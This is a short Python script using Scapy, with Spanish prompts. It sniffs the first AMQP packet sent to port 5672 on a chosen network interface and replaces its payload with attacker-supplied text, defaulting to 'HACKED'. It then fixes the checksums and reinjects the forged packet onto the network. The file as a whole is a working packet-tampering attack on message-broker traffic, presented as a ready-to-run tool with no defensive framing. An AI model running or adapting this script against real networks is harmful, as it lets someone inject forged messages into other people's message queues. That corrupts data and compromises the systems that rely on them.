# amqp_duplicate_modify.py
from scapy.all import *

# Pregunta interfaz
interfaces = get_if_list()
print("Interfaces detectadas:", flush=True)
for i, iface in enumerate(interfaces):
    print(f"  [{i+1}] {iface}", flush=True)
input_str = input("Elige la interfaz por nombre o número (ENTER para 'eth0'): ").strip()
IFACE = "eth0" if input_str == "" else (interfaces[int(input_str) - 1] if input_str.isdigit() and 1 <= int(input_str) <= len(interfaces) else input_str)

FILTER = "tcp dst port 5672 and tcp[tcpflags] & tcp-push != 0"

print(f"[+] Esperando primer paquete PSH hacia 5672 en {IFACE}…")
pkt = sniff(filter=FILTER, iface=IFACE, count=1, timeout=10)

if not pkt:
    exit("No se detectó paquete válido.")

pkt = pkt[0]
if not pkt.haslayer(Raw):
    exit("El paquete no tiene datos AMQP.")

old = pkt[Raw].load
print(f"[+] Payload original:\n{old}")

nuevo = input("[?] Nuevo payload (texto, ENTER para usar 'HACKED'): ").encode() or b"HACKED"
pkt_mod = pkt.copy()
pkt_mod[Raw].load = nuevo

# Corrige checksums y longitud
if pkt_mod.haslayer('IP'):
    del pkt_mod['IP'].chksum
    del pkt_mod['IP'].len
if pkt_mod.haslayer('TCP'):
    del pkt_mod['TCP'].chksum

print(f"[+] Reinyectando paquete modificado en {IFACE}…")
sendp(pkt_mod, iface=IFACE, verbose=0)
print("[!] Paquete duplicado y modificado enviado.")
